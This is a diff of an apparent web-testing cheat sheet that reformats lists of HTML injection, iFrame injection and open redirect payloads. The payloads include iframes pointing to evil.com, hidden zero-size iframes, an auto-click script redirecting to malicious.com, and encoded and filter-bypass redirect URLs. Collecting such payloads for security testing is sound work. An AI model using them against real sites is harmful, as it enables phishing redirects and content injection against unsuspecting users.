@@ -28,8 +28,14 @@ Basic payloads to test whether HTML input is rendered without sanitization:
 
 ```
 <b>Test</b>
+```
+```
 <i>Injected</i>
+```
+```
 <h1>HTML Injection</h1>
+```
+```
 <div>Injected Content</div>
 ```
 
@@ -41,22 +47,15 @@ Payloads to test whether iFrame tags are allowed or improperly filtered:
 ```
 <html> <iframe src=https://evil.com/ width=600px height=500 px></iframe> </html>
 ```
-
 ```
 <iframe src="https://example.com"></iframe>
 ```
-
----
-
-## 🧪 iFrame Injection (Hidden / Size Manipulation)
-
 ```
 <iframe src="https://example.com" width="0" height="0"></iframe>
 ```
 ```
 <iframe src="https://example.com" style="display:none"></iframe>
 ```
-
 ---
 
 ## 🧪 Open Redirect Payloads
@@ -67,33 +66,21 @@ Payloads to test redirection based on user-controlled input:
 <a href="http://malicious.com" id="redirect">Click here</a>
 <script>document.getElementById('redirect').click();</script>
 ```
-
 ```
 https://target.com/redirect?url=https://example.com
 ```
 ```
 https://target.com/login?next=https://example.com
 ```
-
----
-
-## 🧪 Open Redirect (Encoded Payloads)
-
 ```
 https://target.com/redirect?url=%68%74%74%70%73%3A%2F%2Fexample.com
 ```
-
----
-
-## 🧪 Open Redirect (Relative / Bypass Variants)
-
 ```
 https://target.com/redirect?url=/\/example.com
 ```
 ```
 https://target.com/redirect?url=https:example.com
 ```
-
 ---
 
 ## ⚠️ Notes
